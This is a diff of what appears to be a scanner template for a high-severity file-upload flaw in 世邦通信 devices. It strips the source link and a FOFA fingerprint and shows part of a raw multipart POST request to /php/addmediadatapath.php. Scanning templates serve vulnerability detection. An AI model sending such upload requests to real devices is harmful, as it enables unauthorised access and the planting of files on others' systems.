@@ -3,12 +3,8 @@ info:
   name: 世邦通信addmediadatapath.php文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qnnagnfdva11prfe'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qnnagnfdva11prfe
-    fofa: icon_hash="-1830859634"
 http:
 - raw:
   - 'POST /php/addmediadatapath.php HTTP/1.1
@@ -27,7 +23,6 @@ http:
     ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
 
     Content-Disposition: form-data; name="subpath"
-
 
 
     ------WebKitFormBoundaryYrqVrkjRl2AHEKXG
